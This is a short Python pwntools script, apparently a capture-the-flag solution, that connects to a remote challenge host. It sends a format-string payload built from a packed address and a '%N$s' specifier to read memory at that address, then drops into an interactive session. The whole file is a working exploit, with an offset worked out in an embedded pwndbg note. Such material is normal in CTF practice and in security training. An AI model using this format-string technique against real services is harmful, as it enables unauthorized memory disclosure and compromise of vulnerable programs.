from pwn import *

p = remote("cyberyoddha.baycyber.net", 10005)

redacted = 0x804a008


# 0xfff0faa4

"""
pwndbg> p/x 0xffc37b2c - 0xffc37a54
$1 = 0xd8
"""

fmt = p32(redacted) + (f"%{(0xd8//4) + 1}$s").encode()

print(fmt)

p.sendline(fmt)

p.interactive()
